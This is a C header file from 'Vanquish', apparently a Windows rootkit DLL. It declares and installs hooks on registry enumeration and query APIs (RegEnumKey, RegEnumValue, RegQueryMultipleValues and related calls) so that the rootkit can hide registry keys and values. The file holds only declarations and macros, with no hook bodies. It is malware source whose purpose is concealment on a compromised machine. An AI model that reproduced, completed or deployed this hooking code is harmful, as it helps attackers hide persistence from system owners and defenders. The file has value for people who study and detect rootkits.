/******************************************************************************\

	Vanquish DLL HideReg - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL_HIDEREG__H__
#define __VANQUISH_DLL_HIDEREG__H__

#include "Vanquish_dll.h"

//default load handlers
#define LOAD_KERNEL32__HIDEREG
#define LOAD_ADVAPI32__HIDEREG \
	rkiClearIndexor(); \
	INITIAL_REPLACE_API(RegCloseKey, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumKeyW, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumKeyA, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumKeyExW, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumKeyExA, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumValueW, ADVAPI32); \
	INITIAL_REPLACE_API(RegEnumValueA, ADVAPI32); \
	INITIAL_REPLACE_API(RegQueryMultipleValuesA, ADVAPI32); \
	INITIAL_REPLACE_API(RegQueryMultipleValuesW, ADVAPI32);

#define LOAD_USER32__HIDEREG
#define LOAD_GINADLL__HIDEREG

//default UNload handlers
#define UNLOAD_KERNEL32__HIDEREG
#define UNLOAD_ADVAPI32__HIDEREG \
	rkiEnd(); \
	FINAL_RESTORE_API(RegQueryMultipleValuesW); \
	FINAL_RESTORE_API(RegQueryMultipleValuesA); \
	FINAL_RESTORE_API(RegEnumValueA); \
	FINAL_RESTORE_API(RegEnumValueW); \
	FINAL_RESTORE_API(RegEnumKeyExA); \
	FINAL_RESTORE_API(RegEnumKeyExW); \
	FINAL_RESTORE_API(RegEnumKeyA); \
	FINAL_RESTORE_API(RegEnumKeyW); \
	FINAL_RESTORE_API(RegCloseKey);

#define UNLOAD_USER32__HIDEREG
#define UNLOAD_GINADLL__HIDEREG

//declaring handlers
#define DECLARE_HIDEREG \
	DECLARE_NEWENTRY(RegCloseKey); \
	DECLARE_NEWENTRY(RegEnumKeyW); \
	DECLARE_NEWENTRY(RegEnumKeyA); \
	DECLARE_NEWENTRY(RegEnumKeyExW); \
	DECLARE_NEWENTRY(RegEnumKeyExA); \
	DECLARE_NEWENTRY(RegEnumValueW); \
	DECLARE_NEWENTRY(RegEnumValueA); \
	DECLARE_NEWENTRY(RegQueryMultipleValuesA); \
	DECLARE_NEWENTRY(RegQueryMultipleValuesW);

//extern declare
#define EXTERN_HIDEREG \
	EXTERN_NEWENTRY(RegCloseKey); \
	EXTERN_NEWENTRY(RegEnumKeyW); \
	EXTERN_NEWENTRY(RegEnumKeyA); \
	EXTERN_NEWENTRY(RegEnumKeyExW); \
	EXTERN_NEWENTRY(RegEnumKeyExA); \
	EXTERN_NEWENTRY(RegEnumValueW); \
	EXTERN_NEWENTRY(RegEnumValueA); \
	EXTERN_NEWENTRY(RegQueryMultipleValuesA); \
	EXTERN_NEWENTRY(RegQueryMultipleValuesW);

void rkiClearIndexor();
void rkiEnd();

//Vanquish NEW API declarations follows
//Declarations are in conformance with the real Windows API header files
//Difference between this and real api prototypes:
//    1) prefixed V to the name
//    2) replaced WINAPI with NEWAPI

//Original header definitions: (winbase.h)
//Who da fu*k uses RegQueryMultipleValues?

NEWAPI
LONG
APIENTRY
VRegCloseKey(
	HKEY hKey
	);

NEWAPI
LONG
APIENTRY
VRegEnumKeyW(
	HKEY hKey,
	DWORD dwIndex,
	LPWSTR lpName,
	DWORD cbName
	);

NEWAPI
LONG
APIENTRY
VRegEnumKeyA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    DWORD cbName
    );

NEWAPI
LONG
APIENTRY
VRegEnumKeyExW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPWSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    );

NEWAPI
LONG
APIENTRY
VRegEnumKeyExA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    );

NEWAPI
LONG
APIENTRY
VRegEnumValueW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    );

NEWAPI
LONG
APIENTRY
VRegEnumValueA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    );

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesW (
    HKEY hKey,
    PVALENTW val_list,
    DWORD num_vals,
    LPWSTR lpValueBuf,
    LPDWORD ldwTotsize
    );

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesA (
    HKEY hKey,
    PVALENTA val_list,
    DWORD num_vals,
    LPSTR lpValueBuf,
    LPDWORD ldwTotsize
    );

#endif//__VANQUISH_DLL_HIDEFILES__H__